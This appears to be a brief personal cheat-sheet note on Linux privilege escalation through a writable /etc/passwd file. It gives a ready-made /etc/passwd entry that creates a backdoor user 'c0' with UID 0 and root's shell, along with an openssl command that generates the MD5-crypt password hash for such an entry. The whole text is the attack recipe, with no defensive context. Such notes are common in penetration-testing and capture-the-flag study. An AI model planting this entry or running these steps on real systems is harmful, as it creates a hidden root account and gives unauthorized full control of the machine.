# write new root user line to /etc/passwd
```
c0:$1$coyote0x$S9Aruc4H1kvDizg..ij81.:0:0:root:/root:/bin/bash
```

# generate password for /etc/passwd priv esc
```bash
openssl passwd -1 -salt coyote0x90
```
